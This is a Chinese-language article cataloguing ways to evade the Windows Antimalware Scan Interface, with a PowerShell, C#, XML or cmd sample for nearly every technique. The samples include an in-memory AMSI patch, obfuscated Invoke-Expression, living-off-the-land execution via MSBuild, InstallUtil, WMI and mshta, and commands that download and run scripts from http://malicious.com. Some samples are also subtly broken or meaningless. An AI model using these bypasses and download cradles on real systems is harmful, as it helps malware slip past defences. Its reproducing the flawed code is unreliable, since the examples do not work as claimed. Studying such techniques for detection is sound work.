AMSI（Antimalware Scan Interface）是一种Windows API，用于帮助反恶意软件产品在脚本、内存等执行环境中进行恶意软件检测。尽管AMSI能够显著提高恶意软件检测的效果，攻击者仍然可以使用各种技术来规避AMSI的防御。以下是一些常见的AMSI防御规避技术及详细例子：

### 1. 禁用或绕过AMSI

#### 例子：
- **通过修改内存**：
  攻击者可以直接在内存中修改AMSI相关的函数，以禁用AMSI的功能。
  ```powershell
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
  ```

- **利用内存补丁**：
  使用C#代码在内存中修改AMSI相关的函数。
  ```csharp
  using System;
  using System.Reflection;
  using System.Runtime.InteropServices;
  
  public class AmsiBypass
  {
      [DllImport("kernel32")]
      public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
      [DllImport("kernel32")]
      public static extern IntPtr LoadLibrary(string name);
  
      public static void Bypass()
      {
          var amsi = LoadLibrary("amsi.dll");
          var amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
  
          unsafe
          {
              byte* ptr = (byte*)amsiScanBuffer;
              for (int i = 0; i < 6; i++)
              {
                  *ptr = 0xC3; // RET instruction
                  ptr++;
              }
          }
      }
  }
  ```

### 2. 混淆和编码

#### 例子：
- **Base64编码**：
  将恶意代码Base64编码，然后在内存中解码并执行。
  ```powershell
  $code = 'aW5zdGFsbC1wYWNrYWdlIE5ldC5OZXR3b3Jr'
  $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($code))
  Invoke-Expression $decoded
  ```

- **字符串分割和拼接**：
  将恶意代码分割成小块，然后在运行时拼接执行。
  ```powershell
  $part1 = 'Invoke-'
  $part2 = 'Expression'
  $command = $part1 + $part2
  Invoke-Expression $command
  ```

### 3. 使用反射和动态调用

#### 例子：
- **通过反射加载和执行代码**：
  使用反射从内存中加载并执行恶意代码。
  ```powershell
  $assembly = [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String('base64encodedassembly'))
  $type = $assembly.GetType('Namespace.TypeName')
  $method = $type.GetMethod('MethodName')
  $method.Invoke($null, $null)
  ```

- **调用非托管代码**：
  通过P/Invoke调用非托管代码执行恶意操作。
  ```powershell
  Add-Type @"
  using System;
  using System.Runtime.InteropServices;
  public class Win32 {
      [DllImport("kernel32.dll")]
      public static extern IntPtr LoadLibrary(string dllToLoad);
      [DllImport("kernel32.dll")]
      public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
      [DllImport("kernel32.dll")]
      public static extern bool FreeLibrary(IntPtr hModule);
  }
  "@
  $ptr = [Win32]::LoadLibrary("user32.dll")
  ```

### 4. 利用合法工具

#### 例子：
- **利用MSBuild**：
  利用合法的MSBuild工具执行恶意代码。
  ```xml
  <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
    <Target Name="Build">
      <Exec Command="powershell -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression -Command ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('base64encodedpowershellcode')))" />
    </Target>
  </Project>
  ```

- **利用InstallUtil**：
  利用InstallUtil工具执行恶意代码。
  ```cmd
  C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U maliciousAssembly.exe
  ```

### 5. 环境检测和逃避

#### 例子：
- **环境检测**：
  检测是否在沙盒或虚拟机中运行，如果是则改变行为或停止执行。
  ```powershell
  if (Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty Manufacturer -eq 'VMware, Inc.') { exit }
  ```

- **延时执行**：
  通过延时执行绕过实时检测。
  ```powershell
  Start-Sleep -Seconds 60
  Invoke-Expression -Command (New-Object Net.WebClient).DownloadString("http://malicious.com/script.ps1")
  ```

### 6. 利用WMI

#### 例子：
- **通过WMI执行代码**：
  使用WMI执行恶意代码，绕过AMSI的检测。
  ```powershell
  $wmi = [wmiclass]"\\.\root\cimv2:Win32_Process"
  $wmi.Create("powershell.exe -ExecutionPolicy Bypass -File malicious_script.ps1")
  ```

### 7. 利用脚本解释器

#### 例子：
- **使用cscript或wscript**：
  利用合法的脚本解释器执行恶意代码。
  ```cmd
  cscript.exe malicious_script.vbs
  ```

- **利用mshta**：
  使用mshta执行恶意的HTML应用程序。
  ```cmd
  mshta.exe http://malicious.com/malicious.hta
  ```

通过这些技术，攻击者可以有效地绕过AMSI的防御，执行恶意代码。了解这些规避技术对于提升检测和防御能力至关重要。